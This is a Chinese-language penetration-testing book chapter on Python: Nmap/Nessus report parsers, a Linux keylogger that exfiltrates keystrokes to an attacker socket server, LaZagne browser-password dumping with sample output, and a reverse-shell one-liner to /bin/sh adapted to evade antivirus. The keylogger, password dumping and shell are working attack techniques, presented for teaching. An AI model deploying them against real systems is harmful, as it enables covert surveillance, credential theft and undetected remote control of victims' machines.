# 第十五章：Python 的其他奇迹

网络安全是一个广阔而不断增长的领域。到目前为止，在本书中，我们已经讨论了 Python 在其中发挥作用的各种用例。读者可以利用这些知识来探索 Python 可以在网络安全领域中应用的更多场景。在本章的结束部分，我们将尝试介绍一些其他可以使用 Python 的方式。我们将看看以下内容：

+   使用 Python 解析 Nessus 和 Nmap 报告

+   在 Python 中编写自定义的 Linux 和 Windows 键盘记录器，并在网络上共享日志

+   解析推特推文

+   提取浏览器保存的密码

+   无需防病毒持久性外壳

+   绕过基于主机的防火墙

# 报告解析器

**报告解析器**是为了解析报告或文件而编写的一段代码。在这种情况下讨论的文件是 Nessus 和 Nmap 文件。每个的详细描述和功能在以下部分中都有涵盖。

# Nmap 解析器

Nmap 以各种格式（文本、CSV 和 XML）生成输出。在本节中，我们将学习如何快速轻松地解析 XML 格式的 Nmap 报告文件。我们可以使用两种方法来做到这一点：

+   第一种方法是从头开始构建解析器，并使用我们在第四章中讨论的相同概念，即 XML 解析。

+   第二种推荐的方法是避免重复造轮子。在开发 Python 的任何自动化解决方案之前，养成在互联网上搜索的习惯。Python 拥有令人惊叹的社区支持，有许多不仅在网络安全领域，而且在其他更一般的用例中提供现成解决方案的不同模块。让我们使用其中一个预先构建的 Python 模块。我们将安装`libnmap` Python 模块，如下所示：

```py
pip3 install python-libnmap
```

接下来，创建一个名为`nmap_parser.py`的文件，并将以下代码放入其中：

![](img/954b1411-cf2f-4281-b696-c940a034cfcf.png)

上述代码非常容易理解。我们正在创建一个类并将其命名为`nmap_parser`。在类的构造函数中，我们使用文件路径初始化了一个`self.report_file`实例变量，其中包括报告的名称，用户应该将其作为脚本的第一个参数传递。

在第 9 行，我们初始化了`NmapParser`类的实例，并传递了我们希望解析的文件的路径。它返回`NmapObject`，我们将进一步迭代以获得结果。在第 11 行，我们从先前创建的`NmapObject`中提取`hosts()`列表，之前的代码中称为`report`。值得注意的是，虽然`NmapObject`返回一个列表，但每个列表元素都是`host()`类的对象，该模块通过适当地映射文件中的主机标签来内部创建。

在第 13 行，我们使用`is_up()`方法检查当前正在迭代的主机是否存活。在第 15 行，我们提取主机的所有开放端口。该方法返回一个列表，在第 18 行我们对其进行迭代。它使用的内部格式是`[("22","ssh"),("21","ftp")]`。

在第 20 行，我们调用了`host.get_service`方法，该方法返回服务类的实例。它期望传递端口和服务名称作为参数。

最后，在第 21 行和第 26 行之间，通过调用适当的实例变量和实例方法打印所有相关信息。

该模块的完整 API 文档可以在官方网站上找到：[`libnmap.readthedocs.io/en/latest/index.html`](https://libnmap.readthedocs.io/en/latest/index.html)。

# 运行代码

要运行代码，我们需要将其作为普通的 Python 脚本调用。但是，我们还需要传递我们希望解析的 Nmap 文件的路径/名称作为参数。我已经取了一个样本文件`nmap.xml`，它位于与我们的解析器代码相同的路径上。该文件包含针对多个主机进行的扫描报告。用于生成输出文件的`nmap`命令如下所示：

```py
nmap -Pn -sS -sV -vv --max-retries 3 --max-rtt-timeout 1000ms --top-ports 1000 -oA nmap 10.228.24.1-64 
```

报告的截图如下：

![](img/f43b44ef-438e-410f-9889-2332ea9491eb.png)

让我们使用以下命令运行解析器代码，看看它产生的输出：

```py
python3.5 nmap_parser.py nmap.xml
```

`nmap.xml`是放置在与解析器代码相同文件夹中的文件的名称。如果您的`report`文件位于不同的路径，请将绝对路径作为脚本的参数。

所获得的输出如下所示：

![](img/1a0201a5-cc04-4a1e-aa2c-6e5dbd2d81e1.png)

# Nessus 解析器

Nessus 还以各种格式（CSV、XML、DB 文件、JSON、HTML 等）生成输出。在本节中，我们将了解如何快速轻松地解析 XML 格式的 Nessus 报告文件。同样，我们可以手动创建自定义解析器，也可以使用现成的 Python 模块来完成工作，这对我们来说非常方便。按照以下所示安装所需的模块：

```py
pip3 install python-libnessus
```

接下来，创建一个名为`Nessus_parser.py`的文件，并将以下代码放入其中：

![](img/0e49a40e-4f72-42a2-9c38-4dcbfe9a4a3c.png)

上述代码非常容易理解。我们正在创建一个名为`Nessus_parser`的类，并调用它。在类的构造函数中，我们正在用包括报告名称在内的文件路径初始化一个实例变量`self.n_file`，用户应该将其作为脚本的第一个参数传递。

在第 30 行，我们初始化了`NessusParser`类的实例，并传递了我们希望解析的文件的路径。它返回`NessusObject`，我们将进一步迭代以获得结果。在第 35 行，我们简单地调用`demo_print()`方法，并将`NessusObject()`实例传递给它，其中包含我们希望迭代的主机列表。在第 12 行和第 25 行之间，我们简单地迭代 Nessus 主机实例并打印相关信息。Nessus 解析器与我们之前讨论的 Nmap 解析器非常相似。

该类的完整 API 详细信息可以在官方网站找到：[`libnessus.readthedocs.io/en/stable/`](https://libnessus.readthedocs.io/en/stable/.)

# 运行代码

要运行代码，我们需要将其作为普通的 Python 脚本调用，但是我们还需要传递我们希望解析的 Nessus 文件的路径/名称作为参数。我已经取了一个样本文件`report.nessus`，它位于与我们的解析器代码相同的路径上。该文件包含针对多个主机进行的扫描报告。

报告的截图如下所示：

![](img/08d0bb26-b71e-46f8-80cf-be3666180d24.png)

让我们使用以下命令运行解析器代码，看看它产生的输出：

```py
python3.5 Nessus_parser.py report.nessus
```

`report.nessus`是放置在与解析器代码相同文件夹中的文件的名称。如果您的报告文件位于不同的路径，请将绝对路径作为脚本的参数。

所获得的输出如下所示：

![](img/8e85e498-7fb9-46b0-9297-c4defe64369c.png)

# 需要自定义解析器

我发现这些自定义解析器非常方便的一个典型用例是在客户参与过程中。在每次典型的渗透测试之后，渗透测试人员通常会整合所有 Nessus 报告发现、Nmap 输出以及手动利用生成的 POC，并将它们放入客户创建的自定义 Excel 模板中，或者使用公司的报告生成门户来生成一个综合报告。前面讨论的方法可以用来自动化这个过程。使用我们讨论过的概念，我建议读者制作一个通用的报告生成模块，该模块将整合来自 Nmap 和 Nessus 的发现，并且还将考虑自定义 POC 截图以生成 Excel 和 PDF 格式的报告。

# 键盘记录器和通过套接字的外泄

**键盘记录器**是一种臭名昭著的软件，记录用户按下的所有按键。它在后台作为操作系统进程静默运行。它们能够记录用户密码、浏览历史、机密数据等等。有许多免费可用的键盘记录器，可以立即使用。在本节中，我们将看到如何在 Python 中创建一个强大的自定义键盘记录器。自定义键盘记录器总是更好的，因为我们可以根据自己的需求进行定制。

Python 自带一个非常强大的模块，称为 pyHook，适用于 Windows，还有一个在此模块基础上进行修改以支持基于 Linux 的系统的模块，称为`pyxhook`。互联网上有大量关于`pyhook`基于 Windows 的 Python 键盘记录器用法的教程，但关于 Linux 版本的教程并不多。在本节中，我们将专注于基于 Linux 的键盘记录器。我还将提供一个适用于 Windows 模块的简单代码片段。

本节的目标是模拟真实的攻击场景，因此我们的键盘记录器不仅会将按键保存在文件中，还会在特定时间间隔内将生成的日志发送到攻击者机器。我们将探讨我们之前所看到的与套接字编程相关的概念在这里是如何非常有用的。

让我们从 GitHub 存储库中安装键盘记录器模块的 Linux 版本：

```py
git clone https://github.com/JeffHoogland/pyxhook.git
```

如果您想安装 Python 键盘记录器的 Windows 版本，并且您在 Windows 环境中工作，可以使用`pip`来实现，如下所示：

```py
pip install pyhook
```

# pyxhook - 基于 Linux 的键盘记录器

假设我们已经成功克隆了`pyxhook`的 GitHub 存储库，让我们在下载的存储库目录中运行`cd`命令，并创建一个名为`key_logg.py`的文件，其中包含以下内容：

```py
# cd pyxhook
# gedit key_logg.py
```

键盘记录器使用了下载的`pyxhook`存储库模块。如第 2 行所示，我们正在导入`pyxhook`模块。以下代码创建了一个名为`Mylogger`的自定义类文件。它定义了一个方法`startlogin()`，其中包含触发中心逻辑：

![](img/a1a84b24-c818-4bb2-83e1-a1bd6566eea7.png)

现在，在我们的`my_event`自定义方法中，我们通过调用当前键盘事件来获取按下的键。在第 20 行，我们检查用户是否按下了空格键，其 ASCII 键码为 32。如果是这种情况，我们将`space`关键字替换为一个空格字符串`" "`。在第 22 行，我们更新我们的`self.log_string`实例变量，并附加用户按下的任何内容。

在第 23 行，我们检查键盘记录器的终止条件，这是通过检查用户是否输入了`quitkhan`字符串来确定的。这将设置`self.running flag=False`并停止键盘记录器。如果用户没有输入此字符串，键盘记录器将继续更新`self.log_string`字符串，并在每 5 秒发送`log_string`到攻击者机器上。这由第 25-30 行处理。用于将`log_string`发送到攻击者机器的方法是`send_to_attacker()`方法，其定义从第 8 行开始。

在第 32 行，我们创建了一个名为`hm`的`pyxhook`模块的实例。一旦创建，我们将`hm`实例绑定到一个名为`self.my_event`的自定义方法。当按下键时，这将触发`my_event`方法。在第 33 行，我们将`hm`实例绑定到计算机的键盘，这意味着每当键盘上按下任何键时，都会调用`keyDown`操作，该操作绑定到我们的`my_event`自定义方法。在第 34 行，我们有一个无限循环，它将一直运行，直到`self.running`标志设置为`True`。这意味着`my_event`方法将在每毫秒后被调用，并记录按下的按键。

应该注意，攻击者的 IP 和端口可以根据需要更改。在攻击者端，我们有一个套接字服务器，它在端口`8080`上保持监听并接受来自客户端的连接。每当它接收到任何数据时，它都会将其放入`log_file`日志文件中。实现攻击者服务器的代码片段如下：

![](img/bf648c25-0961-4214-b183-986f2431c796.png)

上述代码很简单，并且在*高级 Python 模块*章节的套接字编程部分中已经详细讨论过。它只是打开一个套接字并监听客户端连接。当它接收到数据时，它将其放入一个日志文件中。让我们运行服务器和键盘记录器，看看将记录哪些按键。

让我们按照以下顺序开始进程：

```py
python3.5 server.py
python3.5 key_logg.py
```

以下截图是我们在输入时记录器产生的终端输出：

![](img/7dd3a5df-2bff-4826-ba4f-6ff13c3eae41.png)

同时，我们打开浏览器并输入[www.google.com](http://www.google.com)。我们还可以将当前窗口传递给攻击者，上面已经输入了数据。参考 GitHub 存储库上分享的例子，`example.py`：[`github.com/JeffHoogland/pyxhook/blob/master/example.py`](https://github.com/JeffHoogland/pyxhook/blob/master/example.py)。

让我们看看服务器生成的日志文件，并分析它捕获了什么：

![](img/989e2309-1b7c-4f1f-b531-cb4f0390c954.png)

哇！从上面的截图可以看出，记录器成功地捕获了所有按键。请随意进一步探索；这是一个非常强大和破坏性的实用程序。

# pyhook - 基于 Windows 的键盘记录器

以下是用于启动基于 Windows 的键盘记录器的代码片段：

![](img/bff0f153-913c-4103-b72f-e1d5e87770ab.png)

如前所述，代码与我们之前在 Linux 用例中讨论的代码相同。上述代码简单地将所有按键记录在一个名为`mylog.txt`的文件中。然而，它不会将其发送给攻击者。通过这个，我们结束了键盘记录器部分。

# 解析 Twitter 推文

作为攻击性安全领域的一员，我们可能会想为什么需要解析 Twitter 推文。这个问题是合理的，因为这个用例更适合于防御性安全。然而，如果我们针对特定个人或特定组织，它可能有助于揭示大量信息。

如前所述，Twitter 推文解析可以被网络情报团队用来查看是否有诽谤或敏感内容是以组织的名义发布的。让我们来看下面的例子，解释了 Twitter 推文解析。首先，我们需要按照以下步骤安装 Python 模块：

```py
pip3 install tweet_parser
```

我们的例子将 Twitter 动态作为输入 JSON 文件，并解析所有推文以生成输出。让我们创建一个名为`sample.py`的文件，如下所示：

![](img/21d15e30-a1a9-4039-9ce1-c7af89368645.png)

让我们使用一个名为`exp.json`的示例 Twitter 动态文件，如下所示：

![](img/d8a5306b-b979-40f8-92d0-0b6b2f55024a.png)

接下来，运行代码以打印所有推文如下：

![](img/039b2d62-486f-45ee-abdc-85ea2a4925f0.png)

第 14 行创建的 Twitter 类对象，`tweet=Tweet(tweet_dict)`，有许多其他方法和变量，可以提供有关推文的详细信息，如日期、时间、喜欢和转发。可以通过运行`dir(tweet)`来获取不同支持的方法，其输出如下：

```py
['__class__', '__contains__', '__delattr__', '__delitem__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'all_text', 'bio', 'clear', 'copy', 'created_at_datetime', 'created_at_seconds', 'created_at_string', 'embedded_tweet', 'favorite_count', 'follower_count', 'following_count', 'fromkeys', 'generator', 'geo_coordinates', 'get', 'gnip_matching_rules', 'hashtags', 'id', 'in_reply_to_screen_name', 'in_reply_to_status_id', 'in_reply_to_user_id', 'items', 'keys', 'klout_id', 'klout_influence_topics', 'klout_interest_topics', 'klout_profile', 'klout_score', 'lang', 'media_urls', 'most_unrolled_urls', 'name', 'original_format', 'poll_options', 'pop', 'popitem', 'profile_location', 'quote_count', 'quote_or_rt_text', 'quoted_tweet', 'retweet_count', 'retweeted_tweet', 'screen_name', 'setdefault', 'text', 'tweet_links', 'tweet_type', 'update', 'user_entered_text', 'user_id', 'user_mentions', 'values']
```

# 用 Python 窃取浏览器密码

Python 在网络安全方面是一种非常强大的语言。有大量令人惊叹的攻击性和防御性安全工具是用 Python 编写的，而且很容易定制和修改以满足我们的需求。在本节中，我们将看到如何使用 Python 来窃取存储在浏览器中的密码。同样，由于我们已经有了许多令人惊叹的工具可供使用，我们不会重复造轮子，而是重复利用已有的工具。让我们按照以下步骤下载 GitHub 存储库：

```py
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZange
pip3 install -r requirement.txt
```

接下来，只需运行该工具以查看浏览器密码，如下所示：

```py
python3.5 laZagne.py browsers

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Firefox passwords -----------------

[+] Password found !!!
URL: https://www.packtpub.com
Login: b'*****'
Password: b'******'

[+] Password found !!!
URL: http://myworld.du.ae
Login: b'******'
Password: b'******'

[+] Password found !!!
URL: https://www.genymotion.com
Login: b'***********'
Password: b'*********'

[+] Password found !!!
URL: https://www.udemy.com
Login: b'*********'
Password: b'********'

[+] Password found !!!
URL: https://retail.onlinesbi.com
Login: b'*********'
Password: b'*******'

[+] Password found !!!
URL: https://www.linkedin.com
Login: b'****'
Password: b'****'

[+] Password found !!!
URL: https://login.microsoftonline.com
Login: b'****'
Password: b'****'

[+] Password found !!!
URL: https://cdp.packtpub.com
Login: b'****'
Password: b'****'

[+] Password found !!!
URL: https://www.netflix.com
Login: b'****'
Password: b'****'

[+] Password found !!!
URL: https://www.phishtank.com
Login: b'****'
Password: b'****'

[+] Password found !!!
URL: https://id.atlassian.com
Login: b'****'
Password: b'****'

[+] Password found !!!
URL: http://192.168.1.102
Login: b'****'
Password: b'****'

[+] Password found !!!
URL: https://twitter.com
Login: b'****'
Password: b'****'

[+] 59 passwords have been found.
For more information launch it again with the -v option
```

这个工具非常方便。它不仅可以提取浏览器密码，还可以从以下位置提取密码：

+   `系统管理员`

+   `全部`

+   `内存`

+   `钱包`

+   `聊天`

+   `邮件`

+   `数据库`

+   `WiFi`

+   `浏览器`

# Python 用于无杀毒软件持久性 shell

正如我们所知，规避杀毒软件的最佳技术之一是编写自定义的利用程序。如果利用程序是从头开始编写的，杀毒引擎几乎没有机会将代码签名与已知的恶意签名匹配。在本节中，我们将编写一个自定义 shell，从受害者的机器返回一个反向 shell，并查看有多少 AV 引擎可以检测到它。

让我们编写一个自定义的利用程序，命名为`my_car.py`，并将以下代码放入其中：

![](img/e17adf32-3de2-4d59-b1a3-b997ee0c56f2.png)

如果我们观察前述代码，我们会发现它是一个 Python 代码的改编，用于将反向 shell 生成到攻击者的 IP 地址。我们正在导入 Python 模块，并在本地为导入的模块分配别名。杀毒引擎主要是基于签名方法工作的，已知的签名，如`subprocess.call["/bin/sh","-i"'\]`，可能会被检测到。在这种情况下，我们正在玩弄本地变量，以确保攻击者 IP、端口号、OS 模块和其他 Python 模块不被检测到。前述代码改编自的原始代码如下所示：

```py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

现在让我们运行代码以查看是否获得 shell。我们将使用 Netcat 监听器接收 shell：

```py
nc -nlvp 8000
python3 my_car.py
```

实施前述命令后，会产生以下截图中显示的输出：

![](img/005f4f32-081f-49bf-a68e-694f61a4c0cb.png)

我们可以看到前述代码运行得相当好。重要的是我们要看看这是否会被任何杀毒引擎检测到。让我们使用 VirusTotal 工具进行检查，如下所示：

![](img/1310a260-8cd5-4e90-aece-b03f27f315b8.png)

现在让我们看看我们是否被任何扫描引擎检测到了：

![](img/4ab459e3-fec5-4f28-9eb0-ca9379387868.png)

正如我们所看到的，57 个扫描引擎中没有一个检测到这个文件。

值得注意的是，这一章节写作和准备的当天我们没有检测结果。随着时间的推移，读者可能会上传更多的样本，后端团队可能会根据代码样本更新签名，因为我已经上传了它。后端人员的静态分析将标记为恶意。然而，稍作修改后，它将能够再次避免被检测。

# 总结

在本章中，我们学习了开发能够规避杀毒软件的自定义利用程序。我们还学习了如何开发一个能够将按键记录发送到远程攻击者的自定义基于 Linux 的键盘记录器。我们还探讨了与解析 Nessus 和 Nmap 报告有关的各种概念。我们了解了如何使用 Python 工具提取浏览器密码，以及如何解析 Twitter 信息。

这一章标志着本书的结束。我建议您更多地了解 Python，并在攻击性安全方面更经常地应用它。一个很好的开始是将本书中讨论的所有示例、用例和利用程序尽可能地泛化。

# 问题

1.  我们能通过电子邮件发送键盘记录吗？

1.  我们如何改进键盘记录代码？

1.  我们如何改进持久性 shell 漏洞利用代码？

# 进一步阅读

+   Python 键盘记录器：[`samsclass.info/127/127_WWC_2014.shtml`](https://samsclass.info/127/127_WWC_2014.shtml)

+   Python 漏洞开发辅助：[`github.com/longld/peda`](https://github.com/longld/peda)

+   面纱：[`www.veil-framework.com/veil-tutorial/`](https://www.veil-framework.com/veil-tutorial/)
